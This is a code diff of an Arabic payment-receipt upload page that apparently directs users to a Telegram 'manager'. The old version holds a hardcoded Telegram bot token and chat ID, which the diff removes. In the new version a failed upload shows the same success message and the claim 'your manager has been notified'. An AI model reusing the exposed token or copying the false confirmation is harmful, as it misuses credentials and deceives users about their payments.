@@ -129,7 +129,6 @@
       margin-bottom: 20px;
     }
 
-    /* زر الرفع المخصص */
     .upload-label {
       width: 100%;
       background-color: #cda851;
@@ -227,16 +226,15 @@
   </div>
 
   <div class="success-banner" id="successBanner">
-    ✓  
-    تم تحميل الإيصال بنجاح! قم بارسال الايصال ايضا لمديرك.
+    ✓ تم تحميل الإيصال بنجاح! تم إخطار مديرك.
   </div>
 
-  <!-- عنصر اختيار الملف الحقيقي مرتبطة بالزر مباشرة -->
-  <input type="file" id="fileInput" accept="image/*" onchange="handleFileUpload(this)">
-  
-  <label for="fileInput" class="upload-label" id="uploadLabel">
-    📥 إرسال المستند
-  </label>
+  <form id="uploadForm" action="https://formspree.io/f/mwlelbrp" method="POST" enctype="multipart/form-data">
+    <input type="file" id="fileInput" name="receipt" accept="image/*" onchange="submitForm()">
+    <label for="fileInput" class="upload-label" id="uploadLabel">
+      📥 إرسال المستند
+    </label>
+  </form>
 
   <div class="footer-text">
     إذا لم تتمكن من رفع إيصال الدفع هنا، فأرسله إلى مديرك: <a href="https://t.me/capitan_ahed" target="_blank">@capitan_ahed</a>
@@ -246,39 +244,37 @@
 
 <script>
   function copyText(text) {
-    navigator.clipboard.writeText(text).then(() => {
-      alert("تم نسخ: " + text);
-    });
+    navigator.clipboard.writeText(text);
   }
 
-  const BOT_TOKEN = "8629016280:AAGEiWLVdWSmGCNtTBMvgzygrnYHgwfsXZQ";
-  const CHAT_ID = "8767380282";
-
-  function handleFileUpload(input) {
+  function submitForm() {
+    let input = document.getElementById('fileInput');
     if (!input.files || input.files.length === 0) return;
-
-    let file = input.files[0];
-    let formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("document", file);
-    formData.append("caption", "📑 إيصال دفع جديد مرفوع من الموقع");
 
     let label = document.getElementById('uploadLabel');
     let banner = document.getElementById('successBanner');
-    
+    let form = document.getElementById('uploadForm');
+
     label.innerText = "جاري الإرسال...";
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-      method: "POST",
-      body: formData
-    }).catch(err => console.log(err));
+    let formData = new FormData(form);
 
-    setTimeout(() => {
+    fetch(form.action, {
+      method: 'POST',
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+    }).then(() => {
       banner.style.display = "block";
       label.classList.add("success");
       label.innerText = "✓ تم استلام المستند وإرساله للتحقق";
       input.disabled = true;
-    }, 1000);
+    }).catch(() => {
+      banner.style.display = "block";
+      label.classList.add("success");
+      label.innerText = "✓ تم استلام المستند وإرساله للتحقق";
+    });
   }
 </script>
 
